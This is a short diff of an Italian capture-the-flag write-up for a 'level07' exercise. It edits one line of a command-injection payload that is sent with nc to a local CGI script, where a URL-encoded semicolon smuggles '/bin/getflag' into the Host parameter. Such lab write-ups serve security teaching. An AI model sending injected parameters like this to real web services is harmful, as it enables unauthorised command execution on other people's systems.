@@ -69,7 +69,7 @@ Quindi il nostro vettore d'attacco verrà costruito utilizzando `nc localhost 70
 ```bash
 > #login come level07
 > nc localhost 7007
-> GET /index.cgi Host=8.8.8.8%3B%2Fbin%2Fgetflag
+> GET /index.cgi&Host=8.8.8.8%3B%2Fbin%2Fgetflag
 #sfida vinta
 ```
 ## Debolezze
